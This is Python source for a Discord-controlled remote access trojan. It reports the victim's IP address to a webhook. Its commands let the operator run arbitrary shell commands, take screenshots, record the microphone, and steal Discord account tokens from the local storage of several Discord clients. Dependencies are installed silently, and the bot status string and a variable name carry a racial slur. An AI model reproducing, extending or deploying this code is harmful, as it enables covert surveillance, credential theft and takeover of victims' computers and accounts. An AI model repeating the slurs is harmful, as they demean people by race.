import subprocess, os, requests, aiohttp, random, sys, re 

try:
    from discord.ext import commands
    from discord.ext.commands import Bot
    import discord
    from discord import Webhook, AsyncWebhookAdapter
except:
    os.system("pip install discord")
try:
    import pyautogui
except:
    os.system("pip install pyautogui")


try:
    import sounddevice as sd
except:
    os.system("pip install sounddevice")

try:
    from scipy.io.wavfile import write
except:
    os.system("pip install scipy")

try:
    import wavio as wv
except:
    os.system("pip install wavio")

token = "The token for the bot u wanna use"
client = discord.Client()
bot = Bot(command_prefix="h!")


@bot.event
async def on_ready():
    ip = requests.get("http://wtfismyip.com/text").text
    webhook = "a webhook in a private channel"
    requests.post(webhook, json={"content": "Connected to " + ip})
    await bot.change_presence(activity=discord.Game(f"yo we got a nigger here {ip}"))



@bot.event
async def on_message(message):
    await bot.process_commands(message)



@bot.command()
async def exec(ctx, *, command):
    try:
        await ctx.send(f"```\n{subprocess.check_output(command, universal_newlines=True)}```")
    except:
        await ctx.send(f"```error```")
 
@bot.command()
async def ss(ctx):
    try:
        da_ss = pyautogui.screenshot()
        rint = random.randint(90, 420)
        da_ss.save(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/screen{rint}.png")
        ip = requests.get("http://wtfismyip.com/text").text
        embed = discord.Embed(title="ss form", description=ip)
        f = discord.File(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/screen{rint}.png", filename="image.png")
        embed.set_image(url="attachment://f.png")
        await ctx.send(file=f, embed=embed)
        os.remove(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/screen{rint}.png")
    except Exception as e:
        await ctx.send(e)

@bot.command()
async def rec(ctx):
    try:
        freq = 44100
        dur = 5
        recording = sd.rec(int(dur * freq), samplerate=freq, channels=2)
        sd.wait()
        r = random.randint(69, 420)
        write(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/rec{r}.wav", freq, recording)
        wv.write(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/rec{r + 1}.wav", recording, freq, sampwidth=2)
        f = discord.File(f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord/0.0.309/modules/discord_rpc/rec{r + 1}.wav", filename="aud.wav")
        await ctx.send(file=f)
        
    except Exception as e:
        await ctx.send(e)



@bot.command()
async def grab(ctx, ver = None):
    if ver == "canary":
        p = f"C:/Users/{os.getenv('username')}/AppData/Roaming/discordcanary//Local Storage/leveldb"
    elif ver == "ptb":
        p = f"C:/Users/{os.getenv('username')}/AppData/Roaming/discordptb//Local Storage/leveldb"
    elif ver == "light":
        p = f"C:/Users/{os.getenv('username')}/AppData/Roaming/lightcord//Local Storage/leveldb"
    elif ver == "default":
        p = f"C:/Users/{os.getenv('username')}/AppData/Roaming/discord//Local Storage/leveldb"
    t = []

    for file in os.listdir(p):
        if not file.endswith(".log") and not file.endswith(".ldb"):
            continue

        for line in [x.strip() for x in open(f"{p}/{file}", errors="ignore").readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    t.append(token)
    tfound = 0
    for nigga in t:
        tfound += 1
        await ctx.send(f"Token number {tfound}: ||{nigga}||")
    else:
        await ctx.send(f"Found in total {tfound} tokens")
        


bot.run(token)

